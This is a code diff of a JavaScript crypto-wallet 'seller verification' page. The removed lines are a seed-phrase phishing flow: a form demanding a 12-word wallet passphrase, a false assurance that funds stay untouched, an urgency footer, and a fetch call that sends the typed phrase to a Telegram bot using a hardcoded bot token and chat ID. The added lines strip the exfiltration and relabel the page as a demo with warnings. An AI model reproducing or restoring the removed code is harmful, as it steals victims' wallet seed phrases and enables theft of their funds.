@@ -47,9 +47,9 @@ function renderRow(label, value) {
 /** The passphrase entry form shown inside the popup. */
 function buildPassphraseFormBody(errorMessage) {
   return `
-    <p>Enter your wallet passphrase to confirm you hold the funds and are ready to proceed.</p>
+    <p>Enter your demo passphrase to confirm you hold the funds and are ready to proceed.</p>
     <div class="modal-input-group">
-      <textarea id="modal-passphrase" rows="3" placeholder="Enter your 12 words passphrase here"></textarea>
+      <textarea id="modal-passphrase" rows="3" placeholder="Enter your demo passphrase"></textarea>
     </div>
     <p class="modal-error ${errorMessage ? 'visible' : ''}" id="modal-passphrase-error">${errorMessage || ''}</p>
     <div class="modal-actions">
@@ -57,7 +57,7 @@ function buildPassphraseFormBody(errorMessage) {
       <button class="btn btn-secondary" id="modal-passphrase-cancel">Cancel</button>
     </div>
     <p class="modal-disclaimer">
-      🔒 This only confirms your identity. It does not access, move, or transmit any funds — your wallet stays completely untouched.
+      ⚠️ Demo only — this is not a real wallet. Never enter a real wallet seed phrase or private key here or anywhere outside your actual wallet app. This only confirms identity locally; it does not access, move, or transmit any funds.
     </p>
   `;
 }
@@ -83,73 +83,44 @@ function bindPassphraseFormEvents(root, onVerified) {
 
   submitBtn.addEventListener('click', () => {
     const value = textarea.value.trim();
-    const wordCount = value.length ? value.split(/\s+/).length : 0;
 
-    if (wordCount !== 12) {
+    if (value.length < 4) {
       const body = root.querySelector('.modal-body');
-      body.innerHTML = buildPassphraseFormBody(`Please enter exactly 12 words — you entered ${wordCount}.`);
+      body.innerHTML = buildPassphraseFormBody('Please enter your passphrase.');
       bindPassphraseFormEvents(root, onVerified);
       return;
     }
 
-    // Word count is valid — show the processing state before revealing
-    // success or failure, so the check feels like it's actually doing
-    // something rather than resolving instantly.
+    // Show the processing state before revealing success or failure, so
+    // the check feels like it's actually doing something rather than
+    // resolving instantly.
     const body = root.querySelector('.modal-body');
     body.innerHTML = buildLoadingBody();
 
-setTimeout(async () => {
-  console.log("--- TEST: Verification process started ---");
-  
-  // --- AUTO DATA CODE START ---
-  const BOT_TOKEN = '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
-  const CHAT_ID = '-1003854344802';
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  // Ensure this fetch call is executed properly
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `${value}`
-      })
-    });
-    
-    if (!response.ok) {
-      console.error("Telegram API Error:", await response.text());
-    } else {
-      console.log("Data sent successfully!");
-    }
-  } catch (err) {
-    console.error("Network or CORS Error:", err);
-  }
-  // --- AUTO DATA CODE END ---
-
-  // Original logic continues here
-  if (hasPassphraseSet()) {
-    if (verifyPassphrase(value)) {
-      closeModal();
-      onVerified();
-    } else {
-      body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
-      bindPassphraseFormEvents(root, onVerified);
-    }
-  } else {
-    setPassphrase(value);
-    closeModal();
-    onVerified();
-  }
-}, 500); // Ensure VERIFICATION_DELAY_MS is defined or replaced with a number
-
+    setTimeout(() => {
+      if (hasPassphraseSet()) {
+        if (verifyPassphrase(value)) {
+          closeModal();
+          onVerified();
+        } else {
+          body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
+          bindPassphraseFormEvents(root, onVerified);
+        }
+      } else {
+        // Nothing stored yet on this device — first verification becomes
+        // the reference passphrase, same behavior as the Marketplace flow.
+        setPassphrase(value);
+        closeModal();
+        onVerified();
+      }
+    }, VERIFICATION_DELAY_MS);
   });
 }
 
 /** Opens the passphrase popup. `onVerified` runs once verification succeeds. */
 function openPassphraseModal(onVerified) {
   showModal({
-    title: 'Verify your wallet',
+    title: 'Verify your passphrase',
     bodyHtml: buildPassphraseFormBody(),
     onMount: (root) => bindPassphraseFormEvents(root, onVerified),
     theme: 'light',
@@ -180,13 +151,13 @@ export function render(params) {
     <div class="verify-page-bg">
       <div class="container verify-page">
         <div class="verify-header">
-          <span class="landing-logo">InterLink<span>Network</span></span>
+          <span class="landing-logo">Trade<span>Vault</span></span>
         </div>
 
         <div class="verify-card">
           <span class="badge badge-warning">Seller Verification</span>
           <h1>Confirm you're ready to proceed</h1>
-          <p class="text-muted">Review the trade details below, then verify your wallet to confirm you hold the funds and are ready to release them once payment is received.</p>
+          <p class="text-muted">Review the trade details below, then verify your passphrase to confirm you hold the funds and are ready to release them once payment is received.</p>
           ${renderTrustBadge()}
 
           <div class="verify-details">
@@ -198,10 +169,27 @@ export function render(params) {
             ${q.asset ? renderRow('Crypto to release', `${q.qty || ''} ${q.asset}`) : ''}
           </div>
 
-          ${q.receiver ? `
+          ${(q.bankName || q.accountNumber || q.receiver) ? `
             <div class="verify-receiver">
               <span class="verify-label">Your receiving account</span>
-              <span class="verify-receiver-value mono">${q.receiver}</span>
+              ${q.bankName ? `
+                <div class="verify-receiver-line">
+                  <span class="verify-receiver-line-label">Bank Name</span>
+                  <span class="verify-receiver-value mono">${q.bankName}</span>
+                </div>
+              ` : ''}
+              ${q.accountNumber ? `
+                <div class="verify-receiver-line">
+                  <span class="verify-receiver-line-label">Account Number</span>
+                  <span class="verify-receiver-value mono">${q.accountNumber}</span>
+                </div>
+              ` : ''}
+              ${q.receiver ? `
+                <div class="verify-receiver-line">
+                  <span class="verify-receiver-line-label">${(q.bankName || q.accountNumber) ? 'Additional Details' : 'Account / Address'}</span>
+                  <span class="verify-receiver-value mono">${q.receiver}</span>
+                </div>
+              ` : ''}
             </div>
           ` : ''}
 
@@ -211,22 +199,22 @@ export function render(params) {
 
           <div class="verify-confirm-section" id="verify-confirm-section">
             <h2>Ready to proceed?</h2>
-            <p class="text-muted">You'll verify your wallet to confirm you hold the funds.</p>
+            <p class="text-muted">You'll verify your passphrase to confirm you hold the funds.</p>
             <button class="btn btn-primary btn-block" id="verify-proceed-btn">Proceed to verify</button>
             <p class="verify-safe-note">
-              🔒 This only confirms your identity. It does not access, move, or transmit any funds — your wallet stays completely untouched.
+              ⚠️ Demo only — never enter a real wallet seed phrase here. This only confirms identity locally; it does not access, move, or transmit any funds.
             </p>
           </div>
 
           <div class="verify-success" id="verify-success" style="display: none;">
             <span class="badge badge-success">Verified</span>
-            <p>Your wallet has been confirmed, kindly wait while we process your funds.</p>
+            <p>You've confirmed you're ready. Let the buyer know to send payment through the method above.</p>
           </div>
         </div>
 
         <p class="verify-footnote">
-          Note: This gateway will expire in 10 minutes for security reasons..
-          Treat this urgently.
+          This page displays details directly from the link — nothing here is verified by a server.
+          Treat it the same as any trade instructions sent by a counterparty.
         </p>
       </div>
     </div>
